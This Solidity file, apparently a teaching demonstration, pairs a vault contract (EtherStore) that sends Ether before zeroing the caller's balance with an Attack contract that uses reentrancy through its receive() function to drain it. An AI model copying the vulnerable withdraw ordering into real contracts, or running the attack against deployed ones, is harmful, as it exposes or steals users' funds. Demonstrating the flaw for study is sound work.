// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EtherStore {

    mapping (address => uint256) public balance;

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balance[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value:bal}(" ");
        require(sent, "fail to send Ether");
        balance[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
}

contract Attack {


    EtherStore public etherStore;
    uint256 public constant AMOUT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    receive() external payable { 
        if (address(etherStore).balance >= AMOUT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUT);
        etherStore.deposit{value: AMOUT}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

}